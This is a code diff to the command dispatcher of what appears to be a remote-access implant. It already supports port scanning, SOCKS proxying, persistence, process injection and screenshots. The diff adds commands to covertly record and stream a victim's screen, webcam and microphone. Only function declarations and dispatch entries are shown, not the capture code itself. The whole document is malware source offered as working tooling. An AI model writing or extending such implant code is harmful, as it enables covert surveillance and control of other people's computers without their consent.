@@ -14,6 +14,13 @@ std::string handle_whoami(const std::vector<std::string>& args);
 std::string handle_uninstall(const std::vector<std::string>& args);
 std::string handle_portscan(const std::vector<std::string>& args);
 std::string handle_socks(const std::vector<std::string>& args, const std::string& agent_id);
+std::string handle_record_display(const std::vector<std::string>& args);
+std::string handle_record_camera(const std::vector<std::string>& args);
+std::string handle_record_mic(const std::vector<std::string>& args);
+std::string handle_stream_display(const std::vector<std::string>& args);
+std::string handle_stream_camera(const std::vector<std::string>& args);
+std::string handle_stream_mic(const std::vector<std::string>& args);
+std::string handle_stream_stop(const std::vector<std::string>& args);
 
 #ifdef _WIN32
 std::string handle_inject(const std::vector<std::string>& args);
@@ -30,6 +37,13 @@ bool is_known_module(const std::string& cmd) {
     if (cmd == "persist") return true;
     if (cmd == "uninstall") return true;
     if (cmd == "socks") return true;
+    if (cmd == "record_display") return true;
+    if (cmd == "record_camera") return true;
+    if (cmd == "record_mic") return true;
+    if (cmd == "stream_display") return true;
+    if (cmd == "stream_camera") return true;
+    if (cmd == "stream_mic") return true;
+    if (cmd == "stream_stop") return true;
 #ifdef _WIN32
     if (cmd == "inject") return true;
     if (cmd == "screenshot") return true;
@@ -48,6 +62,13 @@ std::string dispatch(const Nagomio::Task& task, const std::string& agent_id) {
     if (cmd == "uninstall") return handle_uninstall(task.arguments);
     if (cmd == "portscan") return handle_portscan(task.arguments);
     if (cmd == "socks") return handle_socks(task.arguments, agent_id);
+    if (cmd == "record_display") return handle_record_display(task.arguments);
+    if (cmd == "record_camera") return handle_record_camera(task.arguments);
+    if (cmd == "record_mic") return handle_record_mic(task.arguments);
+    if (cmd == "stream_display") return handle_stream_display(task.arguments);
+    if (cmd == "stream_camera") return handle_stream_camera(task.arguments);
+    if (cmd == "stream_mic") return handle_stream_mic(task.arguments);
+    if (cmd == "stream_stop") return handle_stream_stop(task.arguments);
 #ifdef _WIN32
     if (cmd == "inject") return handle_inject(task.arguments);
     if (cmd == "screenshot") return handle_screenshot(task.arguments);
